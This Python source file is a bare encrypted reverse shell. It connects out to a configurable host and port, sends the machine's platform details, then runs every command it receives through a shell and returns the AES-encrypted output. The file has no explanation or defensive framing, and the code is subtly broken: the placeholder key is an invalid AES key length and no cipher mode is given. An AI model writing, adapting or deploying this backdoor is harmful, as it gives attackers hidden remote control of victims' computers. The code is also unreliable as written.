import socket, os, time, subprocess, platform, base64           
from Crypto.Cipher import AES 

BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
cipher = AES.new('CHANGE ME!')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
st = "127.0.0.1"                   
rt = 6  
s.connect((st, rt))



def getcmd():
	s.settimeout(None)

	version = platform.machine() + " " + platform.platform()
	encoded = EncodeAES(cipher, version)
	s.send(encoded)
	while 1:
		cmd = s.recv(1024)
		decoded = DecodeAES(cipher, cmd)
		rd = subprocess.Popen(decoded, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		srd = rd.stdout.read() + rd.stderr.read()
		encoded = EncodeAES(cipher, srd)
		s.send(encoded)
getcmd()
